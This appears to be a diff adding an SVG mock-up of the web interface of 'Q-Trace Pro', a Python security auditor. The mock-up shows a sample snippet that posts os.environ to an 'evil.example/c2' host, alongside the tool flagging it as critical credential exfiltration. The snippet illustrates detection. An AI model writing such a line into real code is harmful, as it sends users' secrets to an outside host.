@@ -1,0 +1,81 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="660" viewBox="0 0 1200 660" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif">
+  <!-- This is a faithful preview of the live web UI (python webapp.py), built
+       from the same palette/layout. Run the app for the interactive version. -->
+  <defs>
+    <linearGradient id="brand" x1="0" y1="0" x2="1" y2="0">
+      <stop offset="0" stop-color="#4f9cf9"/><stop offset="1" stop-color="#7c5cff"/>
+    </linearGradient>
+  </defs>
+  <rect width="1200" height="660" fill="#0d1117"/>
+
+  <!-- Header -->
+  <rect width="1200" height="56" fill="#11161f"/>
+  <line x1="0" y1="56" x2="1200" y2="56" stroke="#2a3140"/>
+  <text x="24" y="35" font-size="20" font-weight="700" fill="url(#brand)">⚛ Q-Trace Pro</text>
+  <text x="190" y="35" font-size="13" fill="#8b949e">Local-native Python security auditor · logic bombs · exfiltration · OWASP/CWE</text>
+  <rect x="1010" y="18" width="166" height="22" rx="11" fill="none" stroke="#2a3140"/>
+  <text x="1024" y="33" font-size="11.5" fill="#8b949e">engines: 7 healthy ✅</text>
+
+  <!-- Left: source panel -->
+  <rect x="16" y="74" width="560" height="566" rx="12" fill="#161b22" stroke="#2a3140"/>
+  <line x1="16" y1="112" x2="576" y2="112" stroke="#2a3140"/>
+  <text x="34" y="98" font-size="12.5" font-weight="700" fill="#8b949e" letter-spacing="0.6">📝 SOURCE CODE</text>
+  <rect x="34" y="128" width="524" height="320" rx="8" fill="#0b0f16" stroke="#2a3140"/>
+  <g font-family="SFMono-Regular,Consolas,Menlo,monospace" font-size="13.5">
+    <text x="50" y="156" fill="#8b949e">1</text><text x="78" y="156" fill="#ff7b72">import</text><text x="140" y="156" fill="#e6edf3"> os, requests</text>
+    <text x="50" y="180" fill="#8b949e">2</text>
+    <text x="50" y="204" fill="#8b949e">3</text><text x="78" y="204" fill="#79c0ff">requests</text><text x="146" y="204" fill="#e6edf3">.post(</text>
+    <text x="78" y="228" fill="#a5d6ff">    'https://evil.example/c2'</text><text x="320" y="228" fill="#e6edf3">,</text>
+    <text x="78" y="252" fill="#e6edf3">    data=</text><text x="148" y="252" fill="#79c0ff">os</text><text x="170" y="252" fill="#e6edf3">.environ)</text>
+  </g>
+  <!-- example chips -->
+  <g font-size="11.5" fill="#8b949e">
+    <rect x="34" y="464" width="120" height="26" rx="13" fill="#1c2230" stroke="#2a3140"/><text x="46" y="481">Probabilistic bomb</text>
+    <rect x="162" y="464" width="104" height="26" rx="13" fill="#1c2230" stroke="#2a3140"/><text x="174" y="481">Credential exfil</text>
+    <rect x="274" y="464" width="120" height="26" rx="13" fill="#1c2230" stroke="#2a3140"/><text x="286" y="481">Obfuscated payload</text>
+    <rect x="402" y="464" width="92" height="26" rx="13" fill="#1c2230" stroke="#2a3140"/><text x="414" y="481">SQL injection</text>
+  </g>
+  <!-- buttons -->
+  <rect x="34" y="506" width="110" height="38" rx="8" fill="url(#brand)"/><text x="55" y="530" font-size="13" font-weight="700" fill="#fff">⚡ Analyze</text>
+  <rect x="152" y="506" width="74" height="38" rx="8" fill="#1c2230" stroke="#2a3140"/><text x="173" y="530" font-size="13" fill="#e6edf3">Clear</text>
+
+  <!-- Right: results panel -->
+  <rect x="592" y="74" width="592" height="566" rx="12" fill="#161b22" stroke="#2a3140"/>
+  <line x1="592" y1="112" x2="1184" y2="112" stroke="#2a3140"/>
+  <text x="610" y="98" font-size="12.5" font-weight="700" fill="#8b949e" letter-spacing="0.6">🛡️ AUDIT RESULTS</text>
+  <rect x="1028" y="84" width="60" height="22" rx="6" fill="#1c2230" stroke="#2a3140"/><text x="1041" y="99" font-size="11.5" fill="#8b949e">JSON</text>
+  <rect x="1096" y="84" width="76" height="22" rx="6" fill="#1c2230" stroke="#2a3140"/><text x="1106" y="99" font-size="11.5" fill="#8b949e">SARIF</text>
+
+  <!-- metrics -->
+  <g>
+    <rect x="610" y="128" width="128" height="60" rx="10" fill="#1c2230" stroke="#2a3140"/>
+    <text x="624" y="160" font-size="22" font-weight="700" fill="#e6edf3">1</text><text x="624" y="178" font-size="11" fill="#8b949e">FINDINGS</text>
+    <rect x="746" y="128" width="128" height="60" rx="10" fill="#1c2230" stroke="#2a3140"/>
+    <text x="760" y="160" font-size="22" font-weight="700" fill="#e5484d">9.3</text><text x="760" y="178" font-size="11" fill="#8b949e">MAX CVSS</text>
+    <rect x="882" y="128" width="128" height="60" rx="10" fill="#1c2230" stroke="#2a3140"/>
+    <text x="896" y="160" font-size="22" font-weight="700" fill="#e6edf3">3.41</text><text x="896" y="178" font-size="11" fill="#8b949e">AST ENTROPY</text>
+    <rect x="1018" y="128" width="154" height="60" rx="10" fill="#1c2230" stroke="#2a3140"/>
+    <text x="1032" y="160" font-size="22" font-weight="700" fill="#e6edf3">6.2<tspan font-size="13"> ms</tspan></text><text x="1032" y="178" font-size="11" fill="#8b949e">SCAN TIME</text>
+  </g>
+
+  <!-- severity chip + symbolic -->
+  <rect x="610" y="202" width="92" height="24" rx="12" fill="#7d0a0a"/><text x="624" y="218" font-size="11.5" font-weight="700" fill="#fff">1 Critical</text>
+  <circle cx="616" cy="248" r="5" fill="#2ea043"/><text x="630" y="252" font-size="13" fill="#e6edf3"><tspan font-weight="700">Symbolic proof:</tspan> SAFE (no unconditional reachable sink)</text>
+
+  <!-- finding card -->
+  <rect x="610" y="272" width="562" height="180" rx="9" fill="#1c2230" stroke="#2a3140"/>
+  <rect x="610" y="272" width="4" height="180" fill="#7d0a0a"/>
+  <text x="628" y="300" font-size="15" font-weight="700" fill="#e6edf3">Credential / Data Exfiltration</text>
+  <rect x="628" y="312" width="72" height="22" rx="11" fill="#7d0a0a"/><text x="640" y="327" font-size="11.5" font-weight="700" fill="#fff">Critical</text>
+  <rect x="708" y="312" width="74" height="22" rx="6" fill="none" stroke="#2a3140"/><text x="718" y="327" font-size="11" fill="#8b949e">CVSS 9.3</text>
+  <rect x="790" y="312" width="72" height="22" rx="6" fill="none" stroke="#2a3140"/><text x="800" y="327" font-size="11" fill="#4f9cf9">CWE-200</text>
+  <text x="872" y="327" font-size="11.5" fill="#8b949e">confidence: High · line 3</text>
+  <text x="628" y="362" font-size="13" fill="#c9d4e0">Environment variables / secrets are passed directly into an outbound</text>
+  <text x="628" y="381" font-size="13" fill="#c9d4e0">network call — the dominant supply-chain credential-theft pattern.</text>
+  <text x="628" y="405" font-family="monospace" font-size="12" fill="#9fb3c8">↳ environment/secret data passed into an outbound network call</text>
+  <text x="628" y="431" font-size="12.5" fill="#8b949e">💡 Never transmit raw environment/credentials off-host; remove the path.</text>
+
+  <!-- health footer -->
+  <line x1="592" y1="606" x2="1184" y2="606" stroke="#2a3140"/>
+  <text x="610" y="628" font-size="11.5" fill="#8b949e">✅ pattern_matcher   ✅ quantum   ✅ symbolic   ✅ obfuscation   ✅ classic_rules   ✅ ast_parser</text>
+</svg>
